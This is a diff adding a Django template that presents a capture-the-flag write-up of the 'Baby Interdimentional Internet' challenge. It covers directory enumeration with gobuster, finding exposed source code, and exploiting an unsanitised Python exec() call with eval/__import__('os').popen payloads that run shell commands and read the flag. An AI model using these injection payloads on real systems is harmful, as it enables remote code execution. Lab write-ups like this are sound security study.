@@ -1,0 +1,81 @@
+{% extends 'writeapp/base.html' %}
+
+{% load static %}
+
+{% block content %}
+
+<div id="overlay" class="overlay"></div>
+<div class="container-fluid p-5">
+    <div class="row">
+        <div class="form-group col-md-12">
+          <h2 class="mb-5">Baby Interdimentional Internet</h2>
+          <p> <strong> Vulnerability: </strong>Python web app source code exposure leads to RCE. </p>
+
+
+          <p class="mt-5">HTML landing page </p>
+          <img src="{% static 'writeapp/img/bi1.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5 mb-5">Sent the request thru burp and response from server show Werkzueg/1.0 running. </p>
+          <img src="{% static 'writeapp/img/bi2.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">Tried going to /console to see if console is available but file not found</p>
+          <p class="mb-5">Fired up gobuster and found /debug</p>
+
+<pre class="code">
+<code>
+  root@kali:/opt/HTB/SYNACK/baby# gobuster dir  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt    -u http://134.209.16.184:30151/
+  ===============================================================
+  Gobuster v3.0.1
+  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+  ===============================================================
+  [+] Url:            http://134.209.16.184:30151/
+  [+] Threads:        10
+  [+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  [+] Status codes:   200,204,301,302,307,401,403
+  [+] User Agent:     gobuster/3.0.1
+  [+] Timeout:        10s
+  ===============================================================
+  2021/02/02 19:53:22 Starting gobuster
+  ===============================================================
+  /debug (Status: 200)
+</code>
+</pre>
+
+          <p class="mt-5 mb-5">Checked the directory content, we found the source code for this webapp.</p>
+          <img src="{% static 'writeapp/img/bi3.png' %}"  class="img-fluid" alt="">
+          <p class="mt-5">Reviewing the source code we see that the function calc is calling exec(recipe, garage)</p>
+          <p>where recipe is = "ingredient = measurements"</p>
+
+          <p class="mb-5">the variable ingredient will be replaced by the value of measurement and then be displayed by the web app.</p>
+
+          <p>If the request method is a post request, we can supply value into the variable <code> ingredient </code> and <code> measurement. </code></p>
+          <p>Then it calls the function <code> calc </code>which then calls the python <code> exec </code>method .</p>
+          <p>There is no user input sanitzation so we can easily chain commands and obtain RCE.</p>
+
+          <p class="mt-5"> <strong>Federation function containing 'POST' </strong> </p>
+          <img src="{% static 'writeapp/img/bi4.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5"> <strong>calc function that containts the exec() call.</strong> </p>
+          <img src="{% static 'writeapp/img/bi5.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5"> <strong>Code snipplet where the value is returned by the web app from the variable ingredient.</strong> </p>
+          <img src="{% static 'writeapp/img/bi6.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">On burp, we intercepted the response and sent it to repeater.</p>
+          <p>Changed the method from Get to POST and supplied the following data.</p>
+
+          <p class="mt-5"> <code>ingredient=x&measurements=eval('__import__(\'os\').popen(\'ls\').read()')</code> </p>
+          <img src="{% static 'writeapp/img/bi7.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">As expected, we see the server returned the output from the command   . </p>
+          <p>We can then read the flag.</p>
+          <p class="mt-5"> <code>ingredient=x&measurements=eval('__import__(\'os\').popen(\'cat+flag\').read()')</code> </p>
+          <img src="{% static 'writeapp/img/bi8.png' %}"  class="img-fluid" alt="">
+
+
+        </div>
+    </div>
+</div>
+
+
+{% endblock %}
